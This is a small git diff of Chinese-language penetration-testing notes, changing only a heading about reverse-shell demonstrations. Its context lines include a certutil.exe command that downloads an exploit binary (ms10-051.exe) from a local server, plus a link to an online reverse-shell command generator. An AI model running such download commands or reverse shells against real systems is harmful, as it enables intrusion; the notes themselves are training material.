@@ -186,7 +186,7 @@ certutil.exe -urlcache -split -f http://127.0.0.1:8080/ms10-051.exe exploit.exe
 
 ![image-20260121172606962](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260121172606962.png)
 
-## 演示案例5-重头戏-反弹权限(*重要标识)
+### 演示案例5-反弹权限(*重要标识)
 
 棱角社区在线生成反弹shell命令：https://forum.ywhack.com/shell.php
 
